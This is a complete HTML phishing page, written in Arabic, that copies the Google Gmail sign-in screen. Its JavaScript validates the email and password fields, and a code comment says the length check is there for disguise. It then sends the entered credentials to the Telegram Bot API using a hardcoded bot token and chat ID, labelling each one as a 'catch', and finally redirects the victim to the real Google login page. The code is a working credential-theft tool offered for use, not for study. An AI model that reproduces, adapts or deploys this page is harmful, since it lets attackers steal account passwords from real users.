<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - حسابات Google</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { width: 380px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; position: relative; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 5px; color: #202124; }
        p { font-size: 16px; margin-bottom: 25px; color: #202124; }
        .input-group { position: relative; margin-bottom: 10px; text-align: right; }
        input { width: 100%; padding: 13px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; transition: 0.2s; }
        input:focus { border: 2px solid #1a73e8; outline: none; }
        input.error { border: 2px solid #d93025; }
        .error-msg { color: #d93025; font-size: 12px; margin-top: 5px; display: none; text-align: right; }
        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
        .btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 14px; }
        .create-account { color: #1a73e8; font-weight: bold; text-decoration: none; font-size: 14px; }
    </style>
</head>
<body>

    <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo" alt="Google">
        <h1>تسجيل الدخول</h1>
        <p>المتابعة إلى Gmail</p>
        
        <form id="gForm">
            <div class="input-group">
                <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" autocomplete="off">
                <div id="email-error" class="error-msg">⚠️ يرجى إدخال بريد إلكتروني صالح</div>
            </div>

            <div class="input-group">
                <input type="password" id="pass" placeholder="أدخل كلمة المرور">
                <div id="pass-error" class="error-msg">⚠️ كلمة المرور مطلوبة</div>
            </div>

            <div class="footer">
                <a href="#" class="create-account">إنشاء حساب</a>
                <button type="button" class="btn" onclick="validateAndSend()">التالي</button>
            </div>
        </form>
    </div>

    <script>
        const TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
        const CHAT_ID = "5811700860";

        function validateAndSend() {
            const emailInput = document.getElementById('email');
            const passInput = document.getElementById('pass');
            const emailError = document.getElementById('email-error');
            const passError = document.getElementById('pass-error');

            // ريجيكس لفحص صيغة الإيميل (Regex)
            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            let isValid = true;

            // فحص الإيميل
            if (!emailPattern.test(emailInput.value)) {
                emailInput.classList.add('error');
                emailError.style.display = 'block';
                isValid = false;
            } else {
                emailInput.classList.remove('error');
                emailError.style.display = 'none';
            }

            // فحص الباسورد (لازم يكون أكثر من 4 خانات للتمويه)
            if (passInput.value.length < 5) {
                passInput.classList.add('error');
                passError.innerText = "⚠️ كلمة المرور قصيرة جداً";
                passError.style.display = 'block';
                isValid = false;
            } else {
                passInput.classList.remove('error');
                passError.style.display = 'none';
            }

            if (isValid) {
                // إذا كل شيء تمام، نرسل البيانات لبايثونيستا
                const report = `📧 **صيد Gmail محقق:**\n\n👤 الحساب: \`${emailInput.value}\`\n🔑 الباسورد: \`${passInput.value}\``;

                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: "Markdown" })
                }).then(() => {
                    // التحويل النهائي
                    window.location.href = "https://accounts.google.com/ServiceLogin?service=mail";
                });
            }
        }
    </script>
</body>
</html>
